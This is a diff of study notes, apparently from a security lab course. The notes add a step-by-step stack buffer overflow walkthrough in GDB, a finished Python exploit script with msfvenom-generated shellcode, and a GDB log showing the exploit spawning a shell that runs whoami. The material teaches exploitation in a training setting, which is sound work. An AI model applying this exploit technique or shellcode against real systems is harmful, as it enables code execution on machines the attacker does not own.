@@ -1872,19 +1872,81 @@ break <address>  #   Establish a break point
 		- shell command gives you a shell from GDB and exit to go back to GDB
 		- run <<<$(echo "aafdafdvcjadsbkhjbfhjdbasjfhjdbabfdkbfkjdbsafkdkfajbahfkdasjcndlkjanlkdlcdlncadbscldbsalhj") is how to pass information into GDB program to break it
 		- Make a .py script that will generate a string to perform the buffer overflow for us against the program.
-			- vim exploit.py
+			- vim bufferoverflow.py and chmod 755
 ```
-buffer = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+#!/usr/bin/env python
 
-EIP = "BBBB"
+buffer = "A" * 40 # This number changes to find the buffer size.
 
-nop = '\x90' * 5
-
-print(buffer + eip + nop)
+print(buffer)
 ```
 
+  		- Using gdb use run <<<$(./bufferoverflow.py) to change the buffer size and get a feel for the size of the buffer
+    		- Wiremask.eu -> Tools -> BufferOverflowPatternGenerator -> Copy the 200 byte pattern and paste it as the "buffer" variable
+      		- run <<<$(./bufferoverflow.py)
+			- COPY HEX VALUE FROM THE EIP and paste it inside Wiremask.eu --> BufferOverflowPatternGenerator to find the OFFSET
+   			- Once OFFSET is found adjust the buffer variable to match the value (62)
+      			- Now we create a "eip" variable set to "BBBB"
+	 		- Change Print line to print(buffer+eip)
+			- When we run the run <<<$(./bufferoverflow.py) with the changes we can verify if BBBB is written into the EIP register
+   			- Open new window and Open GDB inside a clean environment with "env -gdb ./func"
+      			- "show env" will show us env variables and we will unset ALL values using "unset env {VARIABLE}"
+	 		- NORMAL GDB ASSEMBLY LOCATIONS inside (gdb) "run" to see memory location
+    			- NORMAL GDB run "info proc map" and COPY the START of next memory address down from the [HEAP] and the END of [STACK] Line
+       			- PASTE noth  into your python script as "find /b {address1}, {address2}, 0xff, 0xe4" COPY THIS AND PASTE IN NORMAL GDB
+	  		- PASTE INTO NORMAL GDB "find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4" and grab the FIRST 4 addresses as these are the first jump esp locations
+     			- PASTE the 4 locations into your SCRIPT THEN BREAK INTO BYTES AND FLIP
+					- 0xf7de3b59 --> 0xf7 de 3b 59 --> "\x59\x3b\xde\xf7" FINAL
+     					- 0xf7f588ab --> 0xf7 f5 88 ab --> "\xab\x88\xf5\xf7" FINAL
+					- 0xf7f645fb --> 0xf7 f6 45 fb --> "\xfb\x45\xf6\xf7" FINAL
+     					- 0xf7f6460f --> 0xf7 f6 64 0f --> "\x0f\x64\xf6\xf7" FINAL
+	  		- QUIT NORMAL GDB using "quit"
+     			- Now we can Generate SHELL CODE using MSFVENOM / MSFCONSOLE
+			- MSFVENOM (Creating shell code)
+   				- msfvenom --list payloads
+				- msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+    			-MSFCONSOLE 
+       				- msfdb init
+	   			- msfconsole
+       				- use payload/linux/x86/exec
+	   			- show options
+       				- set CMD whoami
+	   			- generate -b '\x00' -f python
+    			- COPY FIRST JMP LOCATION \x59\x3b\xde\xf7 and insert it in your "eip" variable as (eip = "\x59\x3b\xde\xf7")
+       			- CREATE a (nop = "\x90" * 15) Variable
+	  		- COPY and paste your msfvenom output into script
+	  		- CHANGE PRINT to "print(buffer+eip+nop+buf)"
+     			- run <<<$(./bufferoverflow.py) with saved changes if it doesnt work we have to REGENERATE SHELL CODE from MSFCONSOLE/VENOM
+			- BELOW has the final script and exploit used
+```
+#!/usr/bin/env python
 
+buffer = "A" * 62
+eip = "\x59\x3b\xde\xf7"
+nop = "\x90" * 15
+buf =  b"" 
+buf += b"\xba\xae\x60\x19\x3b\xda\xc9\xd9\x74\x24\xf4\x5f"
+buf += b"\x2b\xc9\xb1\x0b\x31\x57\x14\x83\xc7\x04\x03\x57"
+buf += b"\x10\x4c\x95\x73\x30\xc8\xcf\xd6\x20\x80\xc2\xb5"
+buf += b"\x25\xb7\x75\x15\x45\x5f\x86\x01\x86\xfd\xef\xbf"
+buf += b"\x51\xe2\xa2\xd7\x65\xe4\x42\x28\x1d\x8c\x2d\x49"
+buf += b"\x8c\x25\xb2\xde\x1d\x3c\x53\x2d\x21"
 
+print(buffer+eip+nop+buf)
+```
+
+```
+gdb-peda$ run <<<$(./bufferoverflow.py)
+Starting program: /home/student/func <<<$(./bufferoverflow.py)
+Enter a string: 
+process 3112 is executing new program: /bin/dash
+[New process 3115]
+process 3115 is executing new program: /usr/bin/whoami
+student
+[Inferior 2 (process 3115) exited normally]
+
+```
+			
 
 
 
